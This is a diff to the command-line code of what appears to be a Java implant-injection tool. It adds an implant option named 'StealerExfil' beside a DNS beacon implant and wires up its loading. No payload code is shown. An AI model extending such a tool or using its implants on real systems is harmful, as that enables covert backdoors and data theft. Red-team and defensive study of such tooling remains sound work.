@@ -74,7 +74,7 @@ public class Cli {
                 .required(false);
         classInjectorParser.addArgument("-i", "--implant-class")
                 .help("Name of the class containing a custom 'init()' method and other implant logic.")
-                .choices("ClassImplant", "DnsBeaconImplant")
+                .choices("ClassImplant", "DnsBeaconImplant", "StealerExfil")
                 .setDefault("ClassImplant");
         classInjectorParser.addArgument("-c", "--config")
                 .help("Override one or more configuration properties inside the implant.")
@@ -211,6 +211,12 @@ public class Cli {
             try {
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(DnsBeaconImplant.class);
             } catch (ClassNotFoundException | IOException | ImplantException e) {
+                throw new RuntimeException("Cannot find built-in implant class.", e);
+            }
+        } else if (implantClassName.equals("StealerExfil")) {
+            try {
+                implantHandler = ImplantHandlerImpl.findAndCreateFor(StealerExfil.class);
+            } catch (ClassNotFoundException | IOException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
         } else {
